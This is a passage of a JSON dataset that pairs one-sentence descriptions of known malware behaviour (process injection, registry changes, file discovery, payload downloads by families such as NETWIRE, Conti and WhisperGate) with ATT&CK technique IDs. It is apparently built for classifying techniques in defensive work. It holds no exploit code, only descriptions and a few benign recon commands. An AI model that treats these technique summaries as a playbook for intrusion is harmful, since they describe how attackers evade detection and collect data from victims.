    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole can collect data from the system, and can monitor changes in specified directories.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole can list information about files in a directory and recently opened or used documents. InvisiMole can also search for specific files by supplied file mask.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole can use winapiexec tool for indirect execution of ShellExecuteW and CreateProcessA.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole can obtain a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole can inject itself into another process to avoid detection including use of a technique called ListPlanting that customizes the sorting algorithm in a ListView structure.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole can inject its backdoor as a portable executable into a target process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole can inject its code into a trusted process via the APC queue.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole has used ListPlanting to inject code into a trusted process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole can gather information on the mapped drives, OS version, computer name, DEP policy, memory size, and system volume serial number.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole gathers information on the IP forwarding table, MAC address, configured proxy, and network SSID.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Regin appears to have functionality to modify remote Registry information.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Okrum has used DriveLetterView to enumerate drive information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Okrum has built-in commands for uploading, downloading, and executing files to the system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Okrum can collect computer name, locale information, and information about the OS and architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Okrum can collect network information, including the host IP address, DNS, and proxy information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Okrum can collect the victim username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "PLAINTEE uses reg add to add a Registry Run key for persistence.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "PLAINTEE uses the ipconfig /all command to gather the victim’s IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "gh0st RAT can download files to the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "gh0st RAT has altered the InstallTime subkey.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "gh0st RAT has used the InterlockedExchange, SeShutdownPrivilege, and ExitWindowsEx Windows API functions.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "gh0st RAT can inject malicious code into process created by the \"Command_Create&Inject\" function.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "gh0st RAT has checked for the existence of a Service key to determine if it has already been installed on the system.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "gh0st RAT has gathered system architecture, processor, OS configuration, and installed hardware information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "NETWIRE has the ability to search for files on the compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "NETWIRE can downloaded payloads from C2 to the compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "NETWIRE stores its configuration file within the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "NETWIRE can use Native API including CreateProcess GetProcessById, and WriteProcessMemory.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "NETWIRE can discover processes on compromised hosts.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "NETWIRE can inject code into system processes including notepad.exe, svchost.exe, and vbc.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The NETWIRE payload has been injected into benign Microsoft executables via process hollowing.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "NETWIRE can collect the IP address of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Kivars has the ability to list drives on the infected host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Kivars has the ability to download and execute files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Micropsia searches for anti-virus software and firewall products installed on the victim’s machine using WMI.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Micropsia gathers the hostname and OS version from the victim’s machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Micropsia collects the username from the victim’s machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "SOUNDBITE is capable of modifying the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Conti can discover files on a local system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Conti has used API calls during execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Conti can enumerate through all open processes to search for any that have the string \"sql\" in their process name.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Conti has loaded an encrypted DLL into memory and then executes it.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Conti can retrieve the ARP cache from the local system by using the GetIpNetTable() API call and check to ensure IP addresses it connects to are for local, non-Internet, systems.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "LitePower has the ability to download payloads containing system commands to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "LitePower can use various API calls.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "LitePower can query the Registry for keys added to execute COM hijacking.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "LitePower has the ability to list local drives and enumerate the OS architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "LitePower can determine if the current user has admin privileges.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "MarkiRAT can upload data from the victim's machine to the C2 server.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "MarkiRAT can look for files carrying specific extensions such as: .rtf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pps, .ppsx, .txt, .gpg, .pkr, .kdbx, .key, and .jpb.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "MarkiRAT can download additional files and tools from its C2 server, including through the use of BITSAdmin.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "MarkiRAT can run the ShellExecuteW API via the Windows Command Shell.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "MarkiRAT can search for different processes on a system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "MarkiRAT can obtain the computer name from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "MarkiRAT can retrieve the victim’s username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "WhisperGate can locate files based on hardcoded file extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "WhisperGate can download additional stages of malware from a Discord CDN channel.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "WhisperGate has used the ExitWindowsEx API to flush file buffers to disk and stop running processes.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "WhisperGate has the ability to inject its fourth stage into a suspended process created by the legitimate Windows utility InstallUtil.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "WhisperGate has the ability to enumerate fixed logical drives on a targeted system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The WhisperGate third stage can use the AdvancedRun.exe tool to execute commands in the context of the Windows TrustedInstaller group.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Valak has downloaded a variety of modules and payloads to the compromised host, including IcedID and NetSupport Manager RAT-based malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Valak has the ability to modify the Registry key HKCU\\Software\\ApplicationContainer\\Appsw64 to store information regarding the C2 server and downloads.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Valak has the ability to enumerate running processes on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Valak can use the Registry for code updates and to collect credentials.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Valak can determine the Windows version and computer name on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Valak has the ability to identify the domain and the MAC and IP addresses of an infected machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Valak can gather information regarding the user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Valak can use wmic process call create in a scheduled task to launch plugins and for execution.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Xbash can collect IP addresses and local intranet information from a victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "StrongPity can parse the hard drive on a compromised host to identify specific file extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "StrongPity can download files to specified targets.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "StrongPity can determine if a user is logged in by checking to see if explorer.exe is running.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "StrongPity can identify the hard disk volume serial number on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "StrongPity can identify the IP address of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "BBSRAT has been seen loaded into msiexec.exe through process hollowing to hide its execution.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Gazer injects its communication module into an Internet accessible process through which it performs C2.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Metamorfo has searched the Program Files directories for specific folders and has searched for strings related to its mutexes.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Metamorfo has used MSI files to download additional files to execute.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Metamorfo has written process names to the Registry, disabled IE browser features, deleted Registry keys, and changed the ExtendedUIHoverTime key.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Metamorfo has used native WINAPI calls.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Metamorfo has performed process name checks and has monitored applications.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Metamorfo has injected a malicious DLL into the Windows Media Player process (wmplayer.exe).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Metamorfo has collected the hostname and operating system version from the compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Metamorfo has collected the username from the victim's machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "ThreatNeedle can collect data and files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "ThreatNeedle can obtain file and directory information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "ThreatNeedle can download additional tools to enable lateral movement.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ThreatNeedle can save its configuration data as the following RC4-encrypted Registry key: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameCon.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "ThreatNeedle can collect system profile information from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Ebury can list directory entries.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Pillowmint has collected credit card data using native API functions.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Pillowmint has stored its malicious payload in the registry key HKLM\\SOFTWARE\\Microsoft\\DRM.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Pillowmint has used multiple native Windows APIs to execute and conduct process injections.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Pillowmint can iterate through running processes every six seconds collecting a list of processes to capture from later.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Pillowmint has used the NtQueueApcThread syscall to inject code into svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Pillowmint has used shellcode which reads code stored in the registry keys \\REGISTRY\\SOFTWARE\\Microsoft\\DRM using the native Windows API as well as read HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces as part of its C2.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "FatDuke can copy files and directories from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "FatDuke can enumerate directories on target machines.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "FatDuke can call ShellExecuteW to open the default browser on the URL localhost.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "FatDuke can list running processes on the localhost.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "FatDuke can get user agent strings for the default browser from HKCU\\Software\\Classes\\http\\shell\\open\\command.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "FatDuke can collect the user name, Windows version, computer name, and available space on discs from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "FatDuke can identify the MAC address on the target computer.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "BadPatch collects files from the local system that have the following extensions, then prepares them for exfiltration: .xls, .xlsx, .pdf, .mdb, .rar, .zip, .doc, .docx.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "BadPatch searches for files with specific file extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BadPatch collects the OS system, OS version, MAC address, and the computer name from the victim’s machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "HyperStack can add the name of its communication pipe to HKLM\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\\NullSessionPipes.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "HyperStack can use Windows API's ConnectNamedPipe and WNetAddConnection2 to detect incoming connections and connect to remote shares.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "HyperStack can use default credentials to connect to IPC$ shares on remote machines.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Spark can collect the hostname, keyboard layout, and language from the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Spark has run the whoami command and has a built-in command to identify the user logged in.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Smoke Loader downloads a new version of itself once it has installed. It also downloads additional plugins.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Smoke Loader spawns a new copy of c:\\windows\\syswow64\\explorer.exe and then replaces the executable code in memory with malware.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "ThiefQuest can download and execute payloads in-memory or from disk.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ThiefQuest uses various API to perform behaviors such as executing payloads and performing local enumeration.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "ThiefQuest obtains a list of running processes using the function kill_unwanted.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "PoetRAT has the ability to list files upon receiving the ls command from C2.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "PoetRAT has the ability to copy files and download/upload files into C2 channels using FTP and HTTPS.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "PoetRAT has made registry modifications to alter its behavior upon execution.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "PoetRAT has the ability to list all running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "PoetRAT has the ability to gather information about the compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "PoetRAT sent username, computer name, and the previously generated UUID in reply to a \"who\" command from C2.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "RainyDay can use a file exfiltration tool to collect recently changed files on a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "RainyDay can use a file exfiltration tool to collect recently changed files with specific extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "RainyDay can download files to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The file collection tool used by RainyDay can utilize native API including ReadDirectoryChangeW for folder monitoring.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "RainyDay can enumerate processes on a target system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "PowerShower has added a registry key so future powershell.exe instances are spawned off-screen by default, and has removed all registry entries that are left behind during the dropper process.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "PowerShower has the ability to deploy a reconnaissance module to retrieve a list of the active processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "PowerShower has collected system information on the infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "PowerShower has the ability to identify the current Windows domain of the infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "PowerShower has the ability to identify the current user on the infected host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Avenger has the ability to browse files in directories such as Program Files and the Desktop.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Avenger has the ability to download files from C2 to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Avenger has the ability to use Tasklist to identify running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Avenger has the ability to inject shellcode into svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Avenger has the ability to identify the host volume ID and the OS architecture on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Avenger can identify the domain of the compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "EKANS looks for processes from a hard-coded list.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "EKANS can determine the domain of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "EKANS can use Windows Mangement Instrumentation (WMI) calls to execute operations.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "ftp may be abused by adversaries to transfer tools or files from an external system into a compromised environment.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "XAgentOSX contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory.[1] XAgentOSX contains the showBackupIosFolder function to check for IOS device backups by running ls -la ~/Library/Application\\ Support/MobileSync/Backup/.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "XAgentOSX contains the execFile function to execute a specified file on the system using the NSTask:launch method.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "XAgentOSX contains the getInstalledAPP function to run ls -la /Applications to gather what applications are installed.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "MESSAGETAP checks for the existence of two configuration files (keyword_parm.txt and parm.txt) and attempts to read the files every 30 seconds.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "CARROTBAT has the ability to download and execute a remote file via certutil.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "CARROTBAT has the ability to determine the operating system of the compromised host and whether Windows is being run with x86 or x64 architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Ixeshe collects the username from the victim’s machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "PowerSploit contains a collection of CodeExecution modules that inject code (DLL, shellcode) into a process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Trojan.Karagany can enumerate files and directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Trojan.Karagany can inject a suspended thread of its own process into a new process and initiate via the ResumeThread API.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Trojan.Karagany can capture information regarding the victim's OS, security, and hardware configuration.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Trojan.Karagany can gather information on the network configuration of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Trojan.Karagany can gather information about the user on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Bandook can collect local files from the system .",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Bandook has a command to list files on a system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Bandook can download files to the system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Bandook has used the ShellExecuteW() function call.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Bandook has been launched by starting iexplore.exe and replacing it with Bandook's payload.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Bandook can collect information about the drives available on the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Bandook has a command to get the public IP address from a system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "CrackMapExec can discover specified filetypes and log files on a targeted system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "CrackMapExec can create a registry key using wdigest.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "CrackMapExec can enumerate the system drives and associated system name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "CrackMapExec can collect DNS information from the targeted system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "CrackMapExec can execute remote commands using Windows Management Instrumentation.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "GoldMax can download and execute additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "GoldMax retrieved a list of the system's network interface after execution.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "DropBook can collect the names of all files and folders in the Program Files directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "DropBook can download and execute additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "DropBook has checked for the presence of Arabic language in the infected machine's settings.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Fysbis has used the command ls /etc | egrep -e\"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release\" to determine which Linux OS version is running.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "LookBack can retrieve file listings from the victim machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "LookBack can list running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "CaddyWiper can enumerate all files and directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "CaddyWiper has the ability to dynamically resolve and use APIs, including SeTakeOwnershipPrivilege.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "CaddyWiper can obtain a list of current processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "CaddyWiper can use DsRoleGetPrimaryDomainInformation to determine the role of the infected machine. CaddyWiper can also halt execution if the compromised host is identified as a domain controller.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SMOKEDHAM has used Powershell to download UltraVNC and Ngrok from third-party file sharing sites.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SMOKEDHAM has modified registry keys for persistence, to enable credential caching for credential access, and to facilitate lateral movement via RDP.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "SMOKEDHAM has used the systeminfo command on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SMOKEDHAM has used whoami commands to identify system owners.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "A variant of Elise executes dir C:\\progra~1 when initially run.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Elise injects DLL files into iexplore.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Elise executes ipconfig /all after initial communication is made to the remote server.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Kerrdown can download specific payloads to a compromised host based on OS architecture.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Kerrdown has the ability to determine if the compromised host is running a 32 or 64 bit OS architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "EvilBunny has used various API calls as part of its checks to see if the malware is running in a sandbox.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "EvilBunny has used EnumProcesses() to identify how many process are running in the environment.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "OSX_OCEANLOTUS.D has the ability to upload files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "OSX_OCEANLOTUS.D has a command to download and execute a file on the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "OSX_OCEANLOTUS.D collects processor information, memory information, computer name, hardware UUID, serial number, and operating system version. OSX_OCEANLOTUS.D has used the ioreg command to gather some of this information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "OSX_OCEANLOTUS.D can collect the network interface MAC address on the infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "MiniDuke can enumerate local drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "MiniDuke can gather the hostname on a compromised machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
